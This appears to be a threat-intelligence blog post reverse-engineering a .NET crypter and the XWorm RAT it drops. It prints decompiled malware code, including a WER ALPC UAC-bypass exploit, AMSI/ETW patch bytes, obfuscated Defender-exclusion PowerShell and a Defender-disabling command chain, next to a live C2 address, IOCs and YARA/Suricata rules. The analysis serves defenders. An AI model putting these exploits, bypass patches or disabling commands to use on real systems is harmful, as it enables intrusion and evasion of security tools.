---
title: "Cracking a .NET Crypter to Extract a Weaponized XWorm: Bootkit, Rootkit, and a Zero-Day UAC Bypass"
permalink: /blog/xworm-crypter-bootkit-rootkit/
date: 2026-04-10 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [xworm, crypter, dotnet, aes, pbkdf2, bootkit, rootkit, uefi, r77, dinvoke, yara, static-analysis]
image: /assets/images/social/xworm-crypter-card.png
description: "Tearing apart a .NET crypter to extract dual XWorm RAT payloads — then decompiling the RAT to find a UEFI bootkit with BlackLotus DBX bypass, an r77 rootkit, driver infection, CVE-2026-20817 zero-day UAC bypass, and D/Invoke API evasion."
---

I almost skipped this one. A 930KB .NET binary with 8.00 entropy in `.text` and nothing but `mscoree.dll: _CorExeMain` in the import table — it looked like another commodity crypter wrapping something boring. The automated triage scored it at 51.2, middle of the queue.

Then I decompiled it and the entire crypter was fifty lines of C#. The PBKDF2 password, AES salt, and IV were sitting in the source code in plaintext. Two encrypted resources decrypted to PE executables. Both were XWorm.

That would have been a decent blog post on its own — a crypter teardown with config extraction. But when I decompiled the XWorm payloads, I found something I wasn't expecting: a UEFI bootkit that attempts a BlackLotus DBX bypass and LogoFAIL-style exploit, an r77 userland rootkit that injects into every running process, a driver infection module that adds PE sections to Windows kernel drivers, and a zero-day UAC bypass exploiting CVE-2026-20817 via the Windows Error Reporting ALPC service.

This post documents the full chain: cracking the crypter, extracting both payloads, then diving deep into the XWorm source code to map every capability.

---

## The Crypter

### Sample

| Property | Value |
|---|---|
| **SHA-256** | `27a2505cfd32ca1fda31e58c1d2ddee7e4726b8305fda10b779851e259a2ef9d` |
| **MD5** | `4e4f12fc574559e8bf84bfe074f4cad5` |
| **Size** | 930,304 bytes (909 KB) |
| **Format** | PE32 .NET assembly (.NET 4.x) |
| **Entropy** | `.text` section: **8.00** (maximum — fully encrypted) |
| **Imports** | `mscoree.dll: _CorExeMain` (single import — pure .NET) |
| **Manifest** | `requireAdministrator` — demands elevation on execution |

98% of the file is a single encrypted blob. Only ~3KB of actual .NET IL bytecode — the decryption stub.

### Decompiled Crypter (Complete Source)

ILSpy decompiled the entire crypter to a single class. Here it is in full — fifty lines that reveal the entire operation:

```csharp
namespace vpppapxqlhunnbxavuims;

internal class vpppapxqlhunnbxavuims
{
    // AES-128-CBC decryption with PBKDF2 key derivation
    public static byte[] ytxdtmsv(byte[] yjhll)
    {
        using Aes aes = Aes.Create();
        using MemoryStream ms = new MemoryStream();
        using (CryptoStream cs = new CryptoStream(ms,
            aes.CreateDecryptor(
                new Rfc2898DeriveBytes(
                    "pvpbgplnnimrlzz...crw",    // 256-byte PBKDF2 password
                    Encoding.ASCII.GetBytes("erytiqjdxdutsqckdapnnhprdujedlpd"), // 32-byte salt
                    100                          // 100 iterations
                ).GetBytes(16),                  // 16-byte AES key
                Encoding.ASCII.GetBytes("xbginlypryzblkfy")  // 16-byte IV
            ), CryptoStreamMode.Write))
        {
            cs.Write(yjhll, 0, yjhll.Length);
            cs.Close();
        }
        return ms.ToArray();
    }

    public static void Main()
    {
        // Step 1: Show fake error dialog (social engineering)
        xmcvr(/* powershell -EncodedCommand → MessageBox.Show('Error 0x00005') */);

        // Step 2: Disable Windows Defender (add exclusion paths)
        xmcvr(/* powershell -EncodedCommand → Add-MpPreference -ExclusionPath */);

        // Step 3: Decrypt and drop both payloads from embedded resources
        ResourceManager rm = new ResourceManager("hfxrbyaeumiwhqze",
                                                  Assembly.GetExecutingAssembly());
        for (int i = 0; i < 2; i++)
        {
            string path = Path.Combine(
                Environment.GetEnvironmentVariable("Temp"),   // %TEMP%
                DecryptString(payloadNames[i])                // "CotoRat Build.exe" / "knb3ewbfwxnbt1sc.exe"
            );
            File.WriteAllBytes(path, ytxdtmsv((byte[])rm.GetObject(resourceNames[i])));
            Process.Start(path);  // Execute both
        }
    }
}
```

### Crypter Decryption Flow

![Crypter decryption](/assets/images/posts/xworm/6_crypter.png)
*PBKDF2 derives a 16-byte AES key from the 256-byte password + 32-byte salt with 100 iterations, then AES-128-CBC decrypts each resource with a fixed IV*

### Extracted Crypto Parameters

| Parameter | Value |
|---|---|
| **Algorithm** | AES-128-CBC |
| **Key Derivation** | PBKDF2 (`Rfc2898DeriveBytes`) |
| **Password** | 256-byte random lowercase string |
| **Salt** | `erytiqjdxdutsqckdapnnhprdujedlpd` (32 bytes ASCII) |
| **IV** | `xbginlypryzblkfy` (16 bytes ASCII) |
| **Iterations** | 100 |
| **Derived Key** | `917c288da08c36158a03ec405bb04140` |

With these parameters, the payloads can be extracted using the Python script in the analysis bundle:

```bash
python extract_xworm_crypter.py sample.exe -o extracted/
```

### Decoded PowerShell Commands

The crypter runs two hidden PowerShell commands before dropping payloads:

**Command 1 — Fake error dialog (social engineering):**
```powershell
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.MessageBox]::Show('Error 0x00005','','OK','Error')
```

This displays a Windows error popup with "Error 0x00005" — designed to make the victim think the file is corrupted and move on, while the payloads silently execute in the background.

**Command 2 — Windows Defender exclusion:**
```powershell
Add-MpPreference -ExclusionPath @($env:UserProfile,$env:SystemDrive) -Force
```

Adds `C:\Users\<user>` and `C:\` to Defender's exclusion list — effectively disabling scanning for the entire system drive.

### Extracted Payloads

| # | Filename (decrypted) | SHA-256 | Size | Arch | Family |
|---|---|---|---|---|---|
| 1 | `CotoRat Build.exe` | `710e3226b214aa6d...` | 384,512 | x64 | **XWorm RAT** |
| 2 | `knb3ewbfwxnbt1sc.exe` | `3ac847a0e3137b7f...` | 537,088 | x86 | **XWorm RAT** (obfuscated) |

Both are .NET assemblies. The x64 variant has plaintext class/method names. The x86 variant is ConfuserEx-obfuscated. Same GUID in both (`4a2f8fb6-1077-469a-9246-736e6afe8da1`), confirming they're built from the same XWorm builder.

### Payload Comparison

| Feature | Payload 1 (x64) | Payload 2 (x86) |
|---|---|---|
| **Architecture** | x64 | x86 (WoW64 compatible) |
| **Framework** | .NET 4.8 | .NET 4.7.2 |
| **Masquerade** | `AMD drivers/software` | `VoiceMod` |
| **Obfuscation** | None — plaintext class names | ConfuserEx — randomized namespaces |
| **Size** | 384,512 bytes | 537,088 bytes |
| **Config** | Plaintext in `Config.cs` | Encrypted in obfuscated class |
| **Purpose** | Primary implant (64-bit systems) | Fallback (32-bit / WoW64 persistence) |

The dual drop ensures coverage: the x64 variant runs natively on modern Windows, while the x86 variant works as a fallback on older 32-bit systems or provides WoW64-based persistence (some EDR products monitor 64-bit processes more aggressively than 32-bit ones). Running both simultaneously also makes remediation harder — killing one leaves the other active.

### PowerShell Evasion — The Comment Obfuscation Trick

Both PowerShell commands use an interesting anti-detection technique — they insert **junk comments** (`<#xxx#>`) between every keyword to break signature-based detection:

```powershell
# Command 1 — Fake error (as delivered):
<#mes#>Add-Type -AssemblyName System.Windows.Forms;<#plk#>[System.Windows.Forms.MessageBox]::Show('Error 0x00005','','OK','Error')<#ryw#>

# What it actually does (comments stripped):
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.MessageBox]::Show('Error 0x00005','','OK','Error')

# Command 2 — Defender exclusion (as delivered):
<#rus#>Add-MpPreference <#kgg#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#wjh#> -Force <#lyn#>

# What it actually does (comments stripped):
Add-MpPreference -ExclusionPath @($env:UserProfile,$env:SystemDrive) -Force
```

The junk tags (`<#mes#>`, `<#plk#>`, `<#ryw#>`, `<#rus#>`, `<#kgg#>`, `<#wjh#>`, `<#lyn#>`) are random 3-letter strings that break the `Add-MpPreference` and `MessageBox` signatures that AMSI and AV products scan for. PowerShell's parser treats them as valid comments and ignores them.

Both commands are Base64+UTF-16LE encoded and passed via `powershell.exe -EncodedCommand` in a hidden window (`WindowStyle.Hidden`, `CreateNoWindow=true`) — the victim never sees PowerShell flash on screen.

---

## Kill Chain

![Kill chain](/assets/images/posts/xworm/1_killchain.png)
*Crypter → fake error + Defender exclusion → decrypt dual payloads → XWorm boot sequence → CVE-2026-20817 → AMSI/ETW patch → persistence (5 methods) → bootkit + rootkit → C2 beacon*

---

## XWorm RAT: The Decompiled Source

The x64 payload decompiled cleanly to **33 C# source files** across 3 namespaces (`Client`, `Client.Helper`, `Leb128`). No obfuscation — every class and method name is readable. Here's the complete capability map.

### Configuration

```csharp
// From Config.cs — XWorm C2 configuration
public static string Hosts = "195.10.205.179:25565";     // C2 server
public static string Group = "Superiority";               // Campaign tag
public static string Mutex = "yp07tia%jr+2";              // Instance lock
public static string Key = "cky9r4ytydhcwji3z3dizpj";     // Encryption key
public static string Version = "1.0";                     // XWorm version
public static string TaskClient = "Windows Perfoment Host"; // Sched task name
public static string TaskWatchDog = "OneDrive Downloader";  // Watchdog task
public static string PathClient = "%LocalAppData%\MalwareDefenderW3eb32.exe";
public static string PathWatchDog = "%Windows%\BootExecutor.exe";
public static string RegKey = "Software\gogoduck";         // Registry hive

// Feature flags — ALL enabled in this build
public static bool Install = true;
public static bool BootKit = true;          // UEFI bootkit!
public static bool Rootkit = true;          // r77 rootkit!
public static bool InstallWatchDog = true;
public static bool ExclusionWD = true;      // Defender exclusion
public static bool UserInit = true;         // Userinit hijack
public static bool CmdlineAutorun = true;   // Setup\CmdLine persistence
```

Pastebin fallback C2 is supported — if `Hosts` starts with `PASTEBIN:`, XWorm fetches the real C2 address from a Pastebin raw URL.

### Boot Sequence

When the XWorm payload starts, it executes this initialization chain (from `Program.cs`):

1. **Config.Init()** — decode config, collect hardware ID, GPU, CPU, AV, GeoIP (`ip-api[.]com`)
2. **CVE-2026-20817** — UAC bypass via Windows Error Reporting ALPC (if not admin)
3. **AdvancedBootkit.Deploy()** — UEFI/MBR bootkit installation (new thread)
4. **Rootkit.Initialize()** — r77 rootkit DLL injection
5. **AsmiAndETW.Bypass()** — patch AMSI + ETW in memory
6. **AntiProcess.Start()** — kill debuggers every 2.5 seconds
7. **Install.Run()** — 5 persistence mechanisms
8. **Mutex check** — single instance enforcement
9. **SetProcessCritical()** — BSOD on kill (`RtlSetProcessIsCritical`)
10. **Connect C2** — TCP+TLS 1.2 to `195[.]10[.]205[.]179:25565`

### CVE-2026-20817: Zero-Day UAC Bypass via WER ALPC

![CVE-2026-20817 exploit flow](/assets/images/posts/xworm/3_uac_bypass.png)
*Shared memory → ALPC connect to WER service → send message with method=13 → WER executes command as SYSTEM*

The most dangerous capability in this build. `UACBypass.cs` exploits the Windows Error Reporting service via ALPC (Advanced Local Procedure Call) to execute commands as NT AUTHORITY\SYSTEM without any user interaction.

Here is the actual decompiled exploit code from `UACBypass.cs`:

```csharp
// Decompiled from UACBypass.ExploitCVE202620817()
private static bool ExploitCVE202620817(string commandLine)
{
    // 1. Create anonymous shared memory section (520 bytes)
    IntPtr hMapping = CreateFileMapping(
        new IntPtr(-1),    // INVALID_HANDLE_VALUE = page file backed
        IntPtr.Zero,       // default security
        PAGE_READWRITE,    // 0x04
        0, 520,            // 520 bytes
        null);             // unnamed

    // 2. Map the section and write the command
    IntPtr pShared = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 520);
    byte[] cmdBytes = Encoding.Unicode.GetBytes(commandLine + "\0");
    Marshal.Copy(cmdBytes, 0, pShared, Math.Min(cmdBytes.Length, 520));

    // 3. Connect to WER service via ALPC
    UNICODE_STRING portName = default;
    RtlInitUnicodeString(ref portName, "\\WindowsErrorReportingService");
    
    ConnectMsg connectMsg = new ConnectMsg {
        MessageId = 13,     // method 13 = execute command
        Unknown = 0
    };
    NtAlpcConnectPort(out IntPtr hPort, ref portName, ...);

    // 4. Send the exploit message
    WER_ALPC_MESSAGE msg = new WER_ALPC_MESSAGE {
        method = 13,                                    // execute command
        processId = (uint)Process.GetCurrentProcess().Id,
        sharedMemoryHandle = (uint)hMapping.ToInt64(),  // handle to our command
        commandLineLength = (uint)(commandLine.Length * 2),
    };
    return NtAlpcSendWaitReceivePort(hPort, 0, ref msg, ...) == 0;
}
```

And the command string that gets executed as SYSTEM (from `UACBypass.Run()`):

```batch
cmd.exe /c
  reg add "HKLM\...\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f &
  reg add "HKLM\...\Policies\System" /v ConsentPromptBehaviorAdmin /d 0 /f &
  reg add "HKLM\...\Policies\System" /v PromptOnSecureDesktop /d 0 /f &
  reg add "HKLM\...\Policies\System" /v FilterAdministratorToken /d 0 /f &
  reg add "HKLM\...\Windows Defender\Features" /v TamperProtection /d 0 /f &
  reg add "HKLM\...\Windows Defender" /v DisableAntiSpyware /d 1 /f &
  sc stop WinDefend &
  sc config WinDefend start= disabled &
  start /b "" "C:\path\to\xworm.exe" --elevated
```

A single ALPC message disables UAC, disables Defender tamper protection, disables Defender entirely, stops the WinDefend service, disables it from starting, and re-launches XWorm with admin privileges. All without the user seeing a UAC prompt.

### AMSI + ETW Bypass via D/Invoke

![AMSI and ETW patching flow](/assets/images/posts/xworm/4_amsi_etw.png)
*Force-load amsi.dll → resolve via D/Invoke → set RWX → patch AmsiScanBuffer → patch EtwEventWrite → flush cache*

`AsmiAndETW.cs` patches security telemetry in memory. The key insight is the **forced AMSI initialization** — if `amsi.dll` isn't loaded yet, the code deliberately calls `Assembly.Load()` with garbage bytes, which triggers the .NET runtime to load `amsi.dll`, and then immediately patches it. All API resolution goes through `DInvokeCore` to avoid static import detection:

```csharp
// AMSI patch (x64): makes AmsiScanBuffer return AMSI_RESULT_CLEAN
byte[] amsiPatch = { 0xB8, 0x34, 0x12, 0x07, 0x80, // mov eax, 0x80071234
                     0x66, 0xB8, 0x32, 0x00,         // mov ax, 0x32
                     0xB0, 0x57,                      // mov al, 0x57
                     0xC3 };                          // ret

// ETW patch (x64): makes EtwEventWrite return 0 (success, but logs nothing)
byte[] etwPatch = { 0x48, 0x33, 0xC0,  // xor rax, rax
                    0xC3 };             // ret
```

If `amsi.dll` isn't loaded yet, the code **deliberately triggers AMSI initialization** by calling `Assembly.Load()` with garbage bytes — forcing .NET to load `amsi.dll`, then immediately patches it.

### UEFI Bootkit (AdvancedBootkit.cs)

The most complex module — 500+ lines implementing pre-OS persistence:

**UEFI/GPT path:**
- **BlackLotus DBX bypass**: reads the UEFI `dbx` revocation database via `GetFirmwareEnvironmentVariableW`, checks for BlackLotus revocation hashes, attempts to **overwrite `dbx` with empty data** to remove revocations
- **LogoFAIL-style exploit**: drops a malicious BMP to `\EFI\Microsoft\Boot\bootmgfw.efi.logo.bmp` to exploit UEFI firmware image parser vulnerabilities
- **ESP stager**: mounts the EFI System Partition, backs up `bootmgfw.efi`, drops an XOR-decoded EFI payload (key: `{A7, 3B, F1, 9E, 5D, 2C, 8A, 4F}`), redirects boot via `bcdedit /set {bootmgr} path \EFI\Microsoft\Recovery\SecUpdate.efi`
- **Linux patching**: appends `insmod` lines to GRUB configs for Ubuntu, Fedora, Debian, Arch, CentOS
- **DXE injection**: writes payload as `DxeCore.efi` and modifies UEFI DriverOrder

**MBR/Legacy path:**
- Reads current MBR from `\\.\PhysicalDrive0`
- Loads embedded MBR payload from resource (validated for `0x55AA` boot signature)
- Preserves partition table (bytes 446-509)
- Overwrites MBR directly
- Disables integrity checks via `bcdedit /set TESTSIGNING ON`

### r77 Userland Rootkit (Rootkit.cs)

![r77 rootkit injection chain](/assets/images/posts/xworm/5_rootkit.png)
*DLL unhooking → registry config → mass DLL injection into ALL running processes every 5 seconds*

Implements the [r77 rootkit](https://github.com/bytecode77/r77-rootkit) for process/file/registry hiding:

1. **DLL unhooking**: reads clean copies of `ntdll.dll`, `kernel32.dll`, `kernelbase.dll` from disk and overwrites their `.text` sections in memory — removing EDR hooks
2. **Registry config**: creates `HKLM\SOFTWARE\$77config` with PIDs, process names, file paths, and registry keys to hide
3. **Mass injection**: every 5 seconds, injects `r77-x64.dll` or `r77-x86.dll` into **every running process** via `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread(LoadLibraryW)`
4. **Shutdown cleanup**: hidden `Form` listens for `WM_QUERYENDSESSION` to clean up `$77` registry keys before reboot

### Driver Infection (DriverInfector.cs)

Infects Windows kernel-mode drivers by adding new PE sections:

**Targeted drivers** (non-critical, unlikely to break the system): `null.sys`, `beep.sys`, `rasl2tp.sys`, `raspppoe.sys`, `raspptp.sys`, `modem.sys`, `parport.sys`, `serenum.sys`, `serial.sys`, `usbprint.sys`

**Infection technique:**
1. Parses the target driver's PE headers
2. Adds `.inf` section (XOR-decoded malware payload from embedded resource)
3. Adds `.cfg` section (path to dropped client: `%ProgramData%\WindowsControl\svchost.exe`)
4. Updates section count, `SizeOfImage`, `AddressOfEntryPoint`, and recalculates PE checksum
5. Replaces original driver with infected version (TrustedInstaller impersonation)

### Persistence (Install.cs) — 5 Methods

![Persistence layers](/assets/images/posts/xworm/2_persistence.png)
*Five persistence mechanisms plus UEFI bootkit — designed to survive any single remediation attempt*

| # | Method | Location |
|---|---|---|
| 1 | **Scheduled Task (logon)** | `schtasks /create /sc onlogon /tn "Windows Perfoment Host"` |
| 2 | **Scheduled Task (watchdog)** | `schtasks /create /sc minute /mo 30 /tn "OneDrive Downloader"` |
| 3 | **Userinit hijack** | `HKCU\...\winlogon\Userinit` — appends malware path |
| 4 | **Setup\CmdLine** | `HKLM\SYSTEM\Setup\CmdLine` — runs during Windows setup mode |
| 5 | **Registry Run key** | `HKCU\...\Run` — standard autorun (fallback) |
| 6 | **AppInit_DLLs** | `HKLM\...\Windows\AppInit_DLLs` — loaded into every GUI process |
| 7 | **UEFI Bootkit** | ESP stager or MBR overwrite — survives OS reinstall |

Additional: **file pumping** inflates the installed binary by 700MB+ of null bytes to evade AV file-size scanning limits.

### Windows Defender Kill (WindowsDefender.cs)

The most thorough Defender disablement I've seen in any sample — 17+ settings disabled:

```csharp
// Via WMI MSFT_MpPreference:
DisableRealtimeMonitoring = true
DisableBehaviorMonitoring = true
DisableBlockAtFirstSeen = true
DisableIOAVProtection = true
DisableScriptScanning = true
DisableArchiveScanning = true
DisableIntrusionPreventionSystem = true
DisablePrivacyMode = true
EnableControlledFolderAccess = 0
PUAProtection = 0
DisableAntiSpyware = true
DisableAntiVirus = true
// All threat actions set to "Allow" (6)
// MAPS reporting disabled, sample submission disabled
// Service stopped via "sc stop WinDefend"
// TamperProtection set to 0
```

### Anti-VM Detection (AntiVirtual.cs)

Seven detection methods, any of which triggers `Environment.Exit(0)`:

| Check | Method |
|---|---|
| **Sandbox DLLs** | Scans loaded modules for `SbieDll.dll` (Sandboxie), `snxhk.dll` (Avast), `cmdvrt32.dll` (Comodo) |
| **WMI cache** | `Win32_CacheMemory` returns 0 results in VMs |
| **WMI model** | `Win32_ComputerSystem.Model` contains "virtual", "vmware", "vbox", "thinapp" |
| **Disk size** | System drive < 45 GB = VM (via D/Invoke `GetDiskFreeSpaceEx`) |
| **VirtIO drivers** | Checks `System32\drivers` for `balloon.sys`, `netkvm.sys`, `viofs.sys`, `viostor.sys`, etc. |
| **QEMU/SPICE** | Checks `Program Files` for `qemu-ga` and `SPICE Guest Tools` directories |
| **Sandbox path** | Executable path contains "sandbox" |

Bypass: setting environment variable `DISABLE_ANTIVIRTUAL=1` skips all checks — useful for the operator during testing.

### Plugin System (PluginLoader.cs)

XWorm's capabilities are modular — the core RAT is a launcher, and features like keylogger, screen capture, file manager, and reverse shell are delivered as **plugins** from the C2:

```csharp
// From PluginLoader.cs — reflective .NET assembly loading
public static void Load(byte[] pluginBytes, object[] parameters)
{
    Assembly assembly = AppDomain.CurrentDomain.Load(pluginBytes);
    Type pluginType = assembly.GetType("Plugin.Plugin");
    object instance = Activator.CreateInstance(pluginType);
    // Passes: socket, certificate, HWID, message data
    pluginType.GetMethod("Run").Invoke(instance, parameters);
}
```

The `SaveInvoke` command caches plugins in the registry (`HKCU\Software\gogoduck`) as Base64-encoded binary values — they persist across reboots and reload automatically without re-downloading from C2.

### Encryption (EncryptString.cs + Xor.cs)

Two encryption schemes:

1. **Config strings**: XOR with a cyclic key from the `enc` field. If no custom key was set by the builder, strings are stored in plaintext — which is the case for this sample.
2. **Resources** (TLS certificate, driver payload): **RC4** encryption despite the class being named `Xor.cs`. The implementation is a full RC4 KSA + PRGA.

### Hardware Fingerprinting (HwidGenerator.cs)

Generates a unique victim ID by MD5-hashing: `Win32_DiskDrive.Model` + `Manufacturer` + `Name` + `Win32_Processor.Name` + Windows version + GPU + install date + processor count. Cached in `HKCU\Software\gogoduck\Hwid`.

### File Protection (SecrityHidden.cs)

Protects malware files from deletion by locking down ACLs:
- Denies Write, Delete, ChangePermissions, TakeOwnership to Everyone (`S-1-1-0`) and Users (`S-1-5-32-545`)
- If admin: also denies SYSTEM (`S-1-5-18`) and Administrators (`S-1-5-32-544`)
- Sets file owner to SYSTEM
- Grants only ReadAndExecute
- Sets `Hidden | System` file attributes

This makes the installed binary undeletable even by the logged-in administrator without first running the `Unlock()` method.

### Process Killer (AntiProcess.cs)

Background thread that kills debuggers and analysis tools every 2.5 seconds. Matches by both process name and window title against a configurable list in `Config.DebuggerList`.

### Continuous Surveillance (PingChecker.cs)

Every 10 seconds, sends a heartbeat to C2 with:
- Round-trip latency measurement
- Active window title (what the victim is currently looking at)
- 100x100 JPEG screenshot thumbnail

This provides the operator with real-time visual surveillance even when no plugin is loaded.

### Critical Process Protection

`Methods.SetProcessCritical()` calls `RtlSetProcessIsCritical` via D/Invoke — killing XWorm causes a Blue Screen of Death. Combined with `Methods.PreventSleep()` (`SetThreadExecutionState` with `ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED`), the system never sleeps and the RAT never stops.

### C2 Protocol

- **Transport**: TCP + TLS 1.2 (`SslStream` with certificate validation **completely disabled** — `ValidateServerCertificate()` always returns `true`)
- **Serialization**: Custom LEB128 binary protocol supporting 13 data types (string, bool, byte, short, int, long, float, double, byte[], ushort, uint, ulong, nested arrays)
- **Beacon**: 19-field `Connect` message with screenshot thumbnail, HWID, GeoIP, CPU, GPU, AV, privilege level, active window
- **Heartbeat**: `Ping`/`Pong` every 10 seconds with screenshot + active window title
- **Timeout**: 60 seconds without response triggers disconnect + reconnect (`LastPing.cs`)
- **Commands**: `Invoke` (load plugin), `SaveInvoke` (cache + load), `Update`, `Restart`, `Exit`, `Uninstall`
- **Host selection**: Supports multiple `host:port1,port2` entries separated by `;`, selects randomly

---

## IOC Appendix

### Network Indicators

| Type | Value | Context |
|---|---|---|
| IP | `195[.]10[.]205[.]179` | C2 server |
| Port | `25565/tcp` | C2 port (TLS 1.2) |
| URL | `hXXp://ip-api[.]com/line/` | GeoIP lookup |

### Host Indicators

| Type | Value | Context |
|---|---|---|
| Mutex | `yp07tia%jr+2` | XWorm instance lock |
| Registry | `HKCU\Software\gogoduck` | Config/plugin storage |
| Registry | `HKLM\SOFTWARE\$77config` | r77 rootkit config |
| Scheduled Task | `Windows Perfoment Host` | XWorm persistence |
| Scheduled Task | `OneDrive Downloader` | Watchdog (30-min) |
| File | `%LocalAppData%\MalwareDefenderW3eb32.exe` | Installed XWorm path |
| File | `%Windows%\BootExecutor.exe` | Watchdog path |
| File | `%ProgramData%\WindowsControl\svchost.exe` | Driver infection drop |
| Process | `AMD drivers/software` (assembly title) | Masquerade (payload 1) |
| Process | `VoiceMod` (assembly title) | Masquerade (payload 2) |

### File Hashes

| Artifact | SHA-256 |
|---|---|
| Crypter (outer) | `27a2505cfd32ca1fda31e58c1d2ddee7e4726b8305fda10b779851e259a2ef9d` |
| XWorm x64 (payload 1) | `710e3226b214aa6d3ab65bb3d8899ea533bdfc6da28602328c5912567c9bcf0c` |
| XWorm x86 (payload 2) | `3ac847a0e3137b7fe4b83a677bbb68ac2fa5043e276fa44d13b6c58be189f943` |

### MITRE ATT&CK Mapping

| ID | Technique | Evidence |
|---|---|---|
| T1542.003 | Pre-OS Boot: Bootkit | UEFI ESP stager, MBR overwrite, BlackLotus DBX bypass |
| T1542.001 | Pre-OS Boot: System Firmware | LogoFAIL-style UEFI exploit, DXE injection |
| T1014 | Rootkit | r77 userland rootkit via DLL injection into all processes |
| T1055.001 | Process Injection: DLL Injection | `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread(LoadLibraryW)` |
| T1068 | Exploitation for Privilege Escalation | CVE-2026-20817 (WER ALPC) |
| T1548.002 | Abuse Elevation Control: UAC Bypass | Registry-based UAC disable + WER ALPC exploit |
| T1562.001 | Impair Defenses: Disable or Modify Tools | AMSI+ETW patching, Defender WMI disable, WdFilter unload, anti-process |
| T1562.004 | Impair Defenses: Disable System Firewall | `netsh advfirewall` exception |
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | Userinit hijack, Registry Run, AppInit_DLLs |
| T1053.005 | Scheduled Task | Logon task + 30-min watchdog |
| T1106 | Native API | D/Invoke dynamic API resolution (no static imports) |
| T1027 | Obfuscated Files | XOR/RC4 encrypted resources, PBKDF2/AES crypter |
| T1059.001 | Command and Scripting: PowerShell | Encoded PowerShell commands |
| T1036 | Masquerading | "AMD drivers/software", "VoiceMod" assembly titles |
| T1497 | Virtualization/Sandbox Evasion | WMI, disk size, VirtIO drivers, sandbox DLL checks |

---

## Detection

### YARA

Four rules in `detection/xworm_crypter_and_rat.yar`:

1. **XWorm_NET_Crypter_PBKDF2** — detects the crypter via PBKDF2 salt + IV
2. **XWorm_RAT_v1_LEB128** — XWorm family detection via LEB128 + D/Invoke + AMSI class names
3. **XWorm_RAT_AdvancedBootkit** — detects XWorm variants with bootkit/rootkit/driver infection
4. **XWorm_RAT_Config_Superiority** — high-fidelity rule targeting this specific build's C2 + mutex + campaign tag

### Suricata

```
alert tcp $HOME_NET any -> $EXTERNAL_NET 25565 (
    msg:"MALWARE XWorm RAT C2 beacon (TLS on port 25565)";
    flow:established,to_server;
    content:"|16 03|"; depth:2;
    detection_filter:type count, track by_src, count 3, seconds 300;
    sid:2026045; rev:1;
)
```

---

## Conclusion

What started as a routine crypter teardown turned into the most feature-complete RAT analysis on this blog. The crypter itself was trivial — fifty lines of C#, PBKDF2 with a hardcoded password, two AES-encrypted resources. The payloads inside were anything but.

This XWorm build has every capability in the playbook: a UEFI bootkit that attempts BlackLotus-style DBX bypass and LogoFAIL exploitation, an r77 rootkit that injects into every running process, kernel driver infection via PE section injection, a zero-day UAC bypass via WER ALPC (CVE-2026-20817), complete Windows Defender kill via WMI, and five separate persistence mechanisms plus file pumping. The operator enabled every feature flag in the builder — `BootKit=true`, `Rootkit=true`, `DriverInfector=true`, `UseInstallAdmin=true`. Maximum aggression, zero subtlety.

The "Superiority" campaign tag fits. The C2 at `195[.]10[.]205[.]179:25565` was active at time of analysis. The dual-architecture payload drop (x64 + x86 simultaneously) ensures coverage across all Windows installations. And the Pastebin C2 fallback means the operator can rotate infrastructure without recompiling the payload.

For defenders: the crypter's PBKDF2 salt (`erytiqjdxdutsqckdapnnhprdujedlpd`) and IV (`xbginlypryzblkfy`) are high-fidelity indicators. The registry key `Software\gogoduck` and the r77 rootkit marker `$77config` are host-level IoCs. And the task name "Windows Perfoment Host" (note the typo — "Perfoment" instead of "Performance") is a reliable detection signal.

---

*Tools used: ILSpy (decompilation), pycryptodome (AES decryption), pefile (PE analysis), custom Python extraction script. XWorm family identification confirmed via LEB128 protocol, D/Invoke class structure, and [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm) reference. CVE-2026-20817 documented from decompiled UACBypass.cs source code.*
